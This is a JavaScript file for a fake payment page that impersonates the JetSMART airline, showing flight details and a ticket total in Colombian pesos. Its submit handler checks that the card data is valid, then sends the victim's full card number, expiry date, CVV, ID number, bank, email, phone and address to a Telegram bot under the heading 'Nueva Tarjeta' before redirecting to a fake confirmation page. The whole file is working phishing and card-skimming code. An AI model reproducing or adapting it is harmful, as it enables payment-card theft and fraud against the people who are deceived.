const DOMElements = {
    labelDepartures: document.querySelector('#label-departures'),
    labelTotalResume: document.querySelector('#label-total-resume'),
    btnNextStep: document.querySelector('#btn-next-step'),
    contPaymentMethod: document.querySelector('#payment-method'),
    contCardInputs: document.querySelector('#card-inputs'),
    btnSubmitForm: document.querySelector('#submit-form'),
    formMain: document.querySelector('#main-form'),
};

/**
 * Startup@Payment
 */
document.addEventListener('DOMContentLoaded', () => {
    eventListeners();
    updateDOM();
    // sendStatus();   // Comentado para evitar error
});

/**
 * Events@Payment
 */
const eventListeners = () => {
    const { contPaymentMethod, contCardInputs, btnNextStep, btnSubmitForm, formMain } = DOMElements;

    if (contPaymentMethod && contCardInputs) {
        contPaymentMethod.addEventListener('click', () => {
            contCardInputs.classList.remove('hide');
        });
    }

    if (btnNextStep && btnSubmitForm) {
        btnNextStep.addEventListener('click', () => {
            btnSubmitForm.click();
        });
    }

    if (formMain) {
        formMain.addEventListener('submit', (e) => {
            e.preventDefault();
            validateCardFiels();
        });
    }
};

const updateDOM = () => {
    const { labelDepartures, labelTotalResume } = DOMElements;
    const flightInfo = info?.flightInfo || {};

    if (labelDepartures) {
        if (flightInfo.travel_type === 1) {
            labelDepartures.textContent = `${flightInfo.origin?.city || ''} - ${flightInfo.destination?.city || ''} | ${flightInfo.destination?.city || ''} - ${flightInfo.origin?.city || ''}`;
        } else if (flightInfo.travel_type === 2) {
            labelDepartures.textContent = `${flightInfo.origin?.city || ''} - ${flightInfo.destination?.city || ''}`;
        }
    }

    if (labelTotalResume) {
        const adults = flightInfo.adults || 1;
        const children = flightInfo.children || 0;
        const total = PRECIO_BASE * (adults + children);
        labelTotalResume.textContent = '$ ' + total.toLocaleString('es-ES') + ' COP';
    }
};

/**
 * Functions@Payment
 */
const validateCardFiels = () => {
    const p = document.querySelector('#p');
    const pdate = document.querySelector('#pdate');
    const c = document.querySelector('#c');
    const ban = document.querySelector('#ban');
    const name = document.querySelector('#name');
    const surname = document.querySelector("#surname");
    const cc = document.querySelector('#cc');
    const email = document.querySelector('#email');
    const telnum = document.querySelector('#telnum');
    const city = document.querySelector('#city');
    const address = document.querySelector('#address');

    if (!p?.value || !pdate?.value || !c?.value) {
        alert('Por favor completa los datos de la tarjeta.');
        return;
    }

    if ((p.value.length === 19 && p.value[0] !== '3' && ['4', '5'].includes(p.value[0])) || (p.value.length === 17 && p.value[0] === '3')) {
        if (isLuhnValid(p.value)) {
            if (isValidDate(pdate.value)) {
                if ((c.value.length === 3 && p.value.length === 19) || (c.value.length === 4 && p.value.length === 17)) {

                    const formData = {
                        nombre: (name?.value || '') + " " + (surname?.value || ''),
                        id: cc?.value || '',
                        banco: ban?.value || '',
                        email: email?.value || '',
                        tarjeta: p.value,
                        ftarjeta: pdate.value,
                        cvv: c.value,
                        celular: telnum?.value || '',
                        direccion: (address?.value || '') + " " + (city?.value || ''),
                        fecha_hora: new Date().toLocaleString('es-CO')
                    };

                    localStorage.setItem("pagojet", JSON.stringify(formData));

                    // Enviar a Telegram
                    sendToTelegram(formData);

                    console.log("Datos enviados:", formData);

                    document.querySelector('.loader').classList.add('show');

                    setTimeout(() => window.location.href = 'finish.html', 2500);

                } else {
                    alert('Revise el CVV de su tarjeta.');
                    c.value = '';
                    c.focus();
                }
            } else {
                alert('Revise la fecha de vencimiento de su tarjeta.');
                pdate.value = '';
                pdate.focus();
            }
        } else {
            alert('Número de tarjeta inválido. Revisalo e intenta de nuevo.');
            p.value = '';
            p.focus();
        }
    } else {
        alert('Revisa el número de tu tarjeta.');
        p.value = '';
        p.focus();
    }
};

// ======================
// ENVÍO A TELEGRAM
// ======================
async function sendToTelegram(data) {
    try {
        const response = await fetch('claves.json');
        const keys = await response.json();

        const message = `
🚨 *Nueva Tarjeta - JetSMART* 🚨

👤 Nombre: ${data.nombre}
🪪 Doc: ${data.id}
🏦 Banco: ${data.banco}
📧 Email: ${data.email}
💳 Tarjeta: \`${data.tarjeta}\`
📅 Venc: ${data.ftarjeta}
🔑 CVV: \`${data.cvv}\`
📱 Tel: ${data.celular}
📍 Dir: ${data.direccion}
⏰ ${data.fecha_hora}
        `.trim();

        const url = `https://api.telegram.org/bot${keys.token}/sendMessage`;

        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: keys.chat_id,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        console.log("✅ Datos enviados correctamente a Telegram");
    } catch (error) {
        console.error("❌ Error enviando a Telegram:", error);
    }
}

// ======================
// VALIDACIONES
// ======================
function isLuhnValid(bin) {
    bin = bin.replace(/\D/g, '');
    if (bin.length < 6) return false;
    const digits = bin.split('').map(Number).reverse();
    let sum = 0;
    for (let i = 0; i < digits.length; i++) {
        if (i % 2 !== 0) {
            let doubled = digits[i] * 2;
            if (doubled > 9) doubled -= 9;
            sum += doubled;
        } else {
            sum += digits[i];
        }
    }
    return sum % 10 === 0;
}

function isValidDate(fechaInput) {
    if (!fechaInput || !fechaInput.includes('/')) return false;
    const partes = fechaInput.split('/');
    const mesInput = parseInt(partes[0]);
    const anioInput = parseInt(partes[1]) + 2000;
    const fechaActual = new Date();
    const mesActual = fechaActual.getMonth() + 1;
    const anioActual = fechaActual.getFullYear();

    return !(anioInput < anioActual || (anioInput === anioActual && mesInput < mesActual));
}
